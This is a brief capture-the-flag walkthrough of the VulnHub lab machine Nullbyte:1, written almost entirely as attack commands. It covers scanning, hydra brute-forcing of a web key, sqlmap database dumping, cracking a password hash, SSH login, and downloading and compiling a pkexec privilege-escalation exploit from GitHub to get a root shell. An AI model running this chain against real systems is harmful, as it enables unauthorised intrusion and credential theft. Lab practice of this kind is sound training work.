

# Nullbyte:1 Walkthrough 

**VulnHub Link:** [Nullbyte:1](https://www.vulnhub.com/entry/nullbyte-1,126/)
**Difficulty:** Easy
**Release Date:** 1 Aug 2015

## 1.Reconnaissance

```bash
nmap -A -O -T4 -P -sV 192.168.100.167
```

## 2.Web Enumeration

dirb http://192.168.100.167

we download image.gif from index.php

```bash
exiftool image.gif
```

we obtain kzMb5nVYJw 

<url>/kzMb5nVYJw ---> key required

```bash
hydra 192.168.100.167 -l user -P /usr/share/wordlists/rockyou.txt http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:F=invalid key"
```

elite found

we intercept the request using burpsuite and copy to file named results.req

```bash
sqlmap -r results.req --dbs --batch
sqlmap -r results.req --dbs --batch -D seth --dump 
```

and then we found user named "ramses"

```bash
echo "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE" | base64 -d
```

we obtain c6d6bd7ebf806f43c76acc3681703b81 and cracked in crackstation ---> "omega"

```bash
ssh ramses@192.168.100.167 -p 777
```

```bash
wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/Nullbyte%3A1/evil-so.c
wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/Nullbyte%3A1/exploit.c
```

```bash
find / -perm /4000 2>/dev/null
```

pkexec vuln exists.

```bash
gcc -shared -o evil.so -fPIC evil-so.c
gcc exploit.c -o exploit
./evil.so
./exploit
```


and BINGO..!! Root shell gained ..!
